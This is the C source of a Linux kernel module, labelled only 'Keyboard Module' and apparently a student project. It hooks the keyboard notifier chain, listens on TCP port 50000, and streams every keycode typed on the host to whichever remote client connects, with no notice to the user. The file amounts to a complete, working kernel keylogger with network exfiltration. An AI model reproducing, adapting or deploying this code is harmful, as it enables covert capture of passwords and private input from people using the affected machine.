#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/printk.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define PORT 50000

static struct socket *sock = NULL; // Socket to send keycodes to the server
static struct socket *client_sock = NULL; // Socket to send keycodes to the client
static struct task_struct *accept_thread = NULL; // Thread to accept connections from the server
static struct sockaddr_in client_address;
static int flag = 0;

static int keyboard_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    struct kvec iovector;
    struct msghdr message;
    int ret;

    // Check if it's a key event
    if (code == KBD_KEYCODE)
    {
        if(flag == 0)
            return NOTIFY_OK;

        // Access the keyboard event data
        struct keyboard_notifier_param param = *(struct keyboard_notifier_param *)_param;
        struct vc_data *vc = param.vc;
        int keycode = param.value;
        
        // Process the key event as needed        
        keycode = htonl(keycode);

        iovector.iov_base = &keycode;
        iovector.iov_len = sizeof(keycode);
        
        // Try to send keycode to client
        if (client_sock == NULL) {
            return NOTIFY_OK;
        
        }

        memset(&message, 0, sizeof(message));
        message.msg_name = &client_address;
        message.msg_namelen = sizeof(client_address);
        message.msg_control = NULL;
        message.msg_controllen = 0;
        message.msg_flags = 0;

        ret = kernel_sendmsg(client_sock, &message, &iovector, 1, sizeof(keycode));
        if (ret < 0) {
            printk(KERN_ERR "Failed to send keycode to client\n");
        }

        printk(KERN_INFO "Sending the code...\n");


    }
    
    // Return NOTIFY_OK to allow further processing of the event
    return NOTIFY_OK;
}

static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_callback
};

// Accept connection
static int accept_thread_fn(void *data) {
    int ret;

    printk(KERN_INFO "Iniciando nova thread\n");

    while (!kthread_should_stop()) {
        // //Wait for a client to connect
        ret = kernel_accept(sock, &client_sock, 0);
        if (ret < 0) {
            if (ret != -EAGAIN) {
                printk(KERN_ERR "Failed to accept connection\n");
            }
            printk(KERN_INFO "Iteration");
            msleep(5000); // avoid busy-waiting
            continue;
        }

        // Print the client's IP address and port
        ret = kernel_getpeername(client_sock, (struct sockaddr *)&client_address);
        if (ret >= 0) {
            printk(KERN_INFO "Accepted connection from %pI4:%u\n",
                   &client_address.sin_addr, ntohs(client_address.sin_port));

            flag = 1;
            break;
        }

    }

    accept_thread = NULL;
    return 0;
}

// Creates socket
static int create_socket(void) {
    struct sockaddr_in server_addr;
    int ret;

    // Create TCP socket
    ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "failed to create socket\n");
        return ret;
    }

    printk(KERN_INFO "Socket criado!\n");
    
    // Setup server address and bind it to the socket
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket to server address
    ret = kernel_bind(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if (ret < 0) {
        printk(KERN_ERR "failed to bind socket\n");
        sock_release(sock);
        return ret;
    }

    printk(KERN_INFO "Socket conectado com o servidor!\n");
    
    // Listen for incoming connections
    ret = kernel_listen(sock, 1);
    if (ret < 0) {
        printk(KERN_ERR "failed to listen on socket\n");
        
        sock_release(sock);
        return ret;
    }

    printk(KERN_INFO "Socket colocado em estado de escuta!\n");
    
    // Create thread to accept connections
    accept_thread = kthread_run(accept_thread_fn, NULL, "accept_thread");
    if (IS_ERR(accept_thread)) {
        printk(KERN_ERR "failed to create accept thread\n");
        sock_release(sock);
        return PTR_ERR(accept_thread);
    }

    return ret;

}


static int __init keyboard_module_init(void)
{ 
    printk(KERN_INFO "Modulo carregado!\n");
    
    // Create server
    create_socket();

    // Register the keyboard notifier
    register_keyboard_notifier(&keyboard_nb);

    return 0;
}

static void __exit keyboard_module_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_nb);

    // Release socket
    if (client_sock){
        printk(KERN_INFO "Soltando socket do cliente!\n");
        sock_release(client_sock);
    }
        
    if (sock){
        printk(KERN_INFO "Soltando socket do servidor!\n");
        sock_release(sock);
    }

    if (accept_thread){
        printk(KERN_INFO "Terminando thread!\n");
        kthread_stop(accept_thread);
    }

        
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Matheus V. Bellini & Angelo B. Guido");
MODULE_DESCRIPTION("Keyboard Module");